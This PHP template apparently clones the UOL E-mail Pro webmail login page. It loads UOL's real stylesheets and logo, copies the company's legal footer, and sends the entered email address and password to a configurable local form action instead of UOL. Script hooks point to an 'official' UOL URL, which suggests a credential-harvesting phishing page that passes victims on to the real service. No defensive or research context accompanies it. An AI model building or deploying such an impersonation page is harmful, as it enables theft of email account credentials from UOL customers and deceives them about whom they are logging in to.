<?php
declare(strict_types=1);

/** Base do login oficial UOL — https://email.uolhost.com.br/ */
$uolOrigin = 'https://email.uolhost.com.br';
$year = (int) date('Y');
$placeholderUser = 'usuário@domínio';
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta name="description" content="Acesse seu e-mail E-mail Pro, personalizado com a sua marca. Mais credibilidade para você e seu negócio."/>
    <meta name="keywords" content="e-mail, e-mail pro, mailpro, e-mail profissional, webmail, uol"/>
    <title><?= e($config['site_title']) ?></title>
    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type"/>
    <meta http-equiv="Content-Language" content="pt-br"/>
    <link href="<?= e($uolOrigin) ?>/v3/assets/css/fontello-awesome.css" rel="stylesheet" type="text/css"/>
    <link href="<?= e($uolOrigin) ?>/v3/assets/css/animation.css" rel="stylesheet" type="text/css"/>
    <link href="<?= e($uolOrigin) ?>/v3/assets/css/fontello.css" rel="stylesheet" type="text/css"/>
    <link href="<?= e($uolOrigin) ?>/v3/assets/css/base.css" media="all" rel="stylesheet" type="text/css"/>
    <link href="<?= e($uolOrigin) ?>/v3/assets/css/style.css" media="all" rel="stylesheet" type="text/css"/>
    <link href="<?= e($uolOrigin) ?>/v3/assets/css/animation-fontello.css" rel="stylesheet" type="text/css"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta http-equiv="Cache-Control" content="no-cache, no-store"/>
    <meta http-equiv="Pragma" content="no-cache, no-store"/>
    <meta name="apple-mobile-web-app-capable" content="yes"/>
    <meta name="apple-touch-fullscreen" content="yes"/>
    <link rel="shortcut icon" href="<?= e($uolOrigin) ?>/favicon.ico" type="image/x-icon"/>
    <link rel="apple-touch-icon" href="<?= e($uolOrigin) ?>/favicon.ico"/>
    <link href="assets/uol-bridge.css?v=2" rel="stylesheet" type="text/css"/>
    <script>var domain = "";</script>
</head>
<body class="login-page icon-uol domainDisabled">

<header class="barra-slot"></header>

<div id="notice" style="display:none">
    <div class="box"><span></span><h4></h4><p></p><span class="ico-cancel"></span></div>
</div>

<?php if ($statusVisible): ?>
<div id="logout-notice" class="uol-logout-notice"><?= e($statusMessage) ?></div>
<?php endif; ?>

<div class="base show">
    <div class="login-center">
        <div class="wrapper">
            <header>
                <div class="box">
                    <a aria-label="Seja bem vindo ao MailPro- Login" class="logo" href="#">
                        <img src="<?= e($uolOrigin) ?>/v3/assets/images/mailpro-novo.png" alt="E-mail Pro UOL"/>
                    </a>
                </div>
            </header>
            <section id="login" aria-label="Formulário de acesso.">
                <div class="box">
                    <form id="login_form" action="<?= e($loginAction) ?>" method="post" novalidate>
                        <input type="hidden" name="lang" value=""/>
                        <input type="hidden" name="domain" value=""/>
                        <input autofocus type="email" aria-label="Digite seu e-mail neste campo."
                               name="login" id="login" placeholder="<?= e($placeholderUser) ?>"
                               class="px-input" required autocomplete="username"/>
                        <div class="password-field-wrapper">
                            <input type="password" aria-label="Digite sua senha neste campo."
                                   id="password" name="password" placeholder="senha"
                                   class="" required autocomplete="current-password"/>
                            <button type="button" class="show-pass" id="toggle_pass"
                                    aria-label="Mostrar senha">mostrar</button>
                        </div>
                        <div id="message"></div>
                        <button type="submit" name="submit" id="login_submit"> Entrar </button>
                    </form>
                </div>
            </section>
            <section id="links" aria-label="Links úteis." class="show">
                <div class="box">
                    <p>
                        <a href="https://faq.uol.com.br/uolhost/content/category/uol-host/e-mail-profissional/" target="new" class="link">Página de ajuda</a>
                    </p>
                    <a href="https://meunegocio.uol.com.br/e-mail">
                        <button tabindex="-1" class="type2" type="button">Criar meu E-mail Profissional</button>
                    </a>
                </div>
            </section>
        </div>
        <footer class="show">
            <div class="box left full copyright mT mB">
                <span class="left mT"> © 1996 - <?= $year ?> - UOL - O melhor conteúdo. Todos os direitos reservados.<br>
                    UNIVERSO ONLINE S/A - CNPJ/MF 01.109.184/0001-95 - Av. Brigadeiro Faria Lima, 1.384, São Paulo/SP - CEP 01452-002
                </span>
            </div>
        </footer>
    </div>
</div>

<script>
window.UOL_MESSAGES = <?= json_encode([
    'authenticating' => uol_msg('authenticating'),
    'network_error'  => uol_msg('network_error'),
], JSON_UNESCAPED_UNICODE) ?>;
window.UOL_OFFICIAL = <?= json_encode(uol_official_url($config), JSON_UNESCAPED_UNICODE) ?>;
</script>
<script src="assets/login.js?v=3"></script>
<script>document.querySelector(".base")?.classList.add("show");</script>
</body>
</html>
